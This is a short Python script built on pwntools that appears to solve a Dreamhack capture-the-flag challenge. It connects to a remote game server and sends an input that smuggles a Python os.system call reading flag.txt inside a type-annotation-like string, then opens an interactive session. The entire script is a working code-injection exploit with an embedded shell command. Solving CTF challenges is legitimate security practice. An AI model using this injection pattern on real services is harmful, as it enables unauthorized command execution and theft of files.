from pwn import *
io = remote("host3.dreamhack.games", 13109)

io.sendlineafter('> ', '# type: __import__("os").system("cat flag.txt") -> 1234')
io.sendlineafter('> ', '1')
io.interactive()
